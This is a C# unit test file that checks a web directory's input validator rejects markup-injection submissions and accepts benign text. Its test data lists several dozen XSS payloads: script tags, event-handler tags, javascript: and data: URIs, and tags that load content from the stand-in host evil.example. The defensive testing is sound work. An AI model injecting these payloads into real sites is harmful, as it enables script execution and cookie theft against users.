using DirectoryManager.Utilities.Validation;

namespace DirectoryManager.Utilities.Tests.Validation
{
    /// <summary>
    /// Locks the INPUT guard used to reject submissions. Every payload here is a
    /// markup-injection vector that can become an executing script in a browser.
    /// The contract under test is <see cref="ScriptValidation.ContainsSuspiciousMarkup(string?)"/>,
    /// which is what the submit/edit POST path must call to block these.
    ///
    /// If any [Theory] row here starts FAILING, a class of XSS payload just became
    /// submittable. Do not "fix" the test by deleting the row — fix the validator.
    /// </summary>
    public class ScriptValidationXssTests
    {
        // -------------------------------------------------------------------
        // Payloads that MUST be rejected (ContainsSuspiciousMarkup == true).
        // Grouped by vector so a regression points at the technique it broke.
        // -------------------------------------------------------------------
        public static IEnumerable<object[]> MaliciousPayloads()
        {
            // Classic <script> tags, including spacing / casing / encoding tricks.
            yield return new object[] { "<script>alert('xss')</script>" };
            yield return new object[] { "<SCRIPT>alert(1)</SCRIPT>" };
            yield return new object[] { "<script src=//evil.example/x.js></script>" };
            yield return new object[] { "<\tscript>alert(1)</script>" };
            yield return new object[] { "< script >alert(1)</ script >" };
            yield return new object[] { "&lt;script&gt;alert(1)&lt;/script&gt;" };           // single-encoded
            yield return new object[] { "&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;" }; // double-encoded

            // Event-handler vectors that carry NO <script> tag (the gap the narrow check misses).
            yield return new object[] { "<img src=x onerror=alert(1)>" };
            yield return new object[] { "<img src=x onerror=alert(1) />" };
            yield return new object[] { "<svg onload=alert(1)>" };
            yield return new object[] { "<svg/onload=alert(1)>" };
            yield return new object[] { "<body onload=alert(1)>" };
            yield return new object[] { "<input autofocus onfocus=alert(1)>" };
            yield return new object[] { "<details open ontoggle=alert(1)>" };
            yield return new object[] { "<marquee onstart=alert(1)>x</marquee>" };
            yield return new object[] { "<video><source onerror=alert(1)></video>" };
            yield return new object[] { "<div onmouseover=\"alert(1)\">hover</div>" };

            // Remote-content / context-breaking tags.
            yield return new object[] { "<iframe src=//evil.example></iframe>" };
            yield return new object[] { "<object data=//evil.example/x.swf></object>" };
            yield return new object[] { "<embed src=//evil.example/x.swf>" };
            yield return new object[] { "<link rel=stylesheet href=//evil.example/x.css>" };
            yield return new object[] { "<base href=//evil.example/>" };
            yield return new object[] { "<meta http-equiv=refresh content=0;url=//evil.example>" };
            yield return new object[] { "<form action=//evil.example><input name=p></form>" };
            yield return new object[] { "</textarea><script>alert(1)</script>" };  // breaks out of a textarea then injects
            yield return new object[] { "<template><img src=x onerror=alert(1)></template>" };

            // Dangerous URI schemes (links that execute or smuggle markup).
            yield return new object[] { "<a href=\"javascript:alert(1)\">click</a>" };
            yield return new object[] { "<a href=\"JAVASCRIPT:alert(1)\">click</a>" };
            yield return new object[] { "<a href=\"java\tscript:alert(1)\">click</a>" };
            yield return new object[] { "<a href=\"vbscript:msgbox(1)\">click</a>" };
            yield return new object[] { "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">x</a>" };
            yield return new object[] { "javascript:alert(document.cookie)" };  // bare scheme in a field
        }

        [Theory]
        [MemberData(nameof(MaliciousPayloads))]
        public void ContainsSuspiciousMarkup_RejectsKnownXssVectors(string payload)
        {
            Assert.True(
                ScriptValidation.ContainsSuspiciousMarkup(payload),
                $"Payload was NOT flagged but should have been: {payload}");
        }

        // -------------------------------------------------------------------
        // Benign content that MUST pass (guards against false positives that
        // would block real submissions). A directory of websites legitimately
        // contains URLs, prices, comparisons, and code-ish punctuation.
        // -------------------------------------------------------------------
        public static IEnumerable<object[]> BenignInputs()
        {
            yield return new object[] { "Accepts Monero for VPS hosting." };
            yield return new object[] { "Fast, no-KYC swaps. 0.5% fee." };
            yield return new object[] { "Open Mon-Fri, 9 < 17 by appointment" };  // "a < b" text, not a tag
            yield return new object[] { "Compare: 5 < 10 and 10 > 5" };
            yield return new object[] { "Visit https://example.com for details" };
            yield return new object[] { "Email admin@example.com" };
            yield return new object[] { "Price is $9.99 (incl. tax)" };
            yield return new object[] { "C# & .NET friendly" };
            yield return new object[] { "Use the <Tab> key" };       // angle word, not a real element name
            yield return new object[] { string.Empty };
            yield return new object[] { "   " };
        }

        [Theory]
        [MemberData(nameof(BenignInputs))]
        public void ContainsSuspiciousMarkup_AllowsBenignContent(string input)
        {
            Assert.False(
                ScriptValidation.ContainsSuspiciousMarkup(input),
                $"Benign input was wrongly flagged as suspicious: {input}");
        }

        [Fact]
        public void ContainsSuspiciousMarkup_NullInput_ReturnsFalse()
        {
            Assert.False(ScriptValidation.ContainsSuspiciousMarkup((string?)null));
        }

        // -------------------------------------------------------------------
        // Object scanning: the submit/edit path passes the whole model, so the
        // scanner must catch a payload hiding in ANY string property (not just
        // the first one) and inside string collections.
        // -------------------------------------------------------------------
        [Fact]
        public void ContainsSuspiciousMarkup_FlagsPayloadInSecondProperty()
        {
            var obj = new Scannable
            {
                First = "totally fine",
                Second = "<img src=x onerror=alert(1)>",
            };

            Assert.True(ScriptValidation.ContainsSuspiciousMarkup(obj));
        }

        [Fact]
        public void ContainsSuspiciousMarkup_CleanObject_ReturnsFalse()
        {
            var obj = new Scannable
            {
                First = "Accepts XMR",
                Second = "https://example.com",
            };

            Assert.False(ScriptValidation.ContainsSuspiciousMarkup(obj));
        }

        [Fact]
        public void ContainsSuspiciousMarkup_FlagsPayloadInsideStringCollection()
        {
            var tags = new List<string> { "privacy", "hosting", "<svg onload=alert(1)>" };

            Assert.True(ScriptValidation.ContainsSuspiciousMarkup(tags));
        }

        // -------------------------------------------------------------------
        // The narrow ContainsScriptTag is retained for back-compat. Pin its
        // exact (limited) contract so nobody mistakes it for full XSS coverage:
        // it catches <script> only, and deliberately does NOT catch handler/URI
        // vectors. That is precisely why the submit path must use the broad check.
        // -------------------------------------------------------------------
        [Fact]
        public void ContainsScriptTag_CatchesLiteralScriptTag()
        {
            Assert.True(ScriptValidation.ContainsScriptTag("<script>alert(1)</script>"));
        }

        [Theory]
        [InlineData("<img src=x onerror=alert(1)>")]
        [InlineData("<svg onload=alert(1)>")]
        [InlineData("<a href=\"javascript:alert(1)\">x</a>")]
        public void ContainsScriptTag_DoesNotCatchNonScriptVectors_DocumentsTheGap(string payload)
        {
            // Documents WHY ContainsScriptTag alone is insufficient as the submit guard.
            // These are real XSS but contain no <script> tag, so the narrow check passes them.
            Assert.False(ScriptValidation.ContainsScriptTag(payload));

            // ...and the broad check is the one that stops them:
            Assert.True(ScriptValidation.ContainsSuspiciousMarkup(payload));
        }

        // Self-contained model for the object-scanning tests, so this file does not
        // depend on a type from another test project. Two string properties verify
        // the scanner checks every property, not just the first.
        private sealed class Scannable
        {
            public string First { get; set; } = string.Empty;

            public string Second { get; set; } = string.Empty;
        }
    }
}
